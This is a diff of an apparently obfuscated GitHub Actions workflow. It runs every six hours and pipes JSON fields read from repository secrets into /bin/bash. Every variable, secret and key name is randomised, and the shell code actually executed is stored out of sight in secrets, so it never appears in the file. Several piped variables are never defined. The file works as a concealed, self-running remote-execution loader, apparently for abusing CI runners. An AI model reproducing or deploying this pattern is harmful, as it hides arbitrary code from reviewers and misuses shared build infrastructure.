@@ -1,10 +1,9 @@
 name: bushishuoy
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 3/6 * * *'
-jobs:  # 31895
+    - cron: '26 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,12 +11,13 @@ jobs:  # 31895
       - uses: actions/checkout@v4
       - name: bushishuoy
         env:
-          l8: ${{ secrets.l8 }}
+          l7955: ${{ secrets.l7955 }}
         run: |
-          echo $l8 | jq -r .it1 | /bin/bash
-          echo $s02 | jq -r .eu786 | /bin/bash
-          echo $b0 | jq -r .vmgm4 | /bin/bash
-          echo $oar78 | jq -r .f511 | /bin/bash
-          echo $qow2 | jq -r .rs0918 | /bin/bash
-          echo $wth78 | jq -r .iiz0863 | /bin/bash
+          echo $l7955 | jq -r .cb7795 | /bin/bash
+          echo $m46609 | jq -r .amdrq21 | /bin/bash
+          echo $yyre94416 | jq -r .jh8727 | /bin/bash
+          echo $cdyf16487 | jq -r .g73230 | /bin/bash
+          echo $iltk84 | jq -r .c51 | /bin/bash
+          echo $haiyo62 | jq -r .mtbhf8 | /bin/bash
+          echo $ktv7315 | jq -r .vnox3657 | /bin/bash
 
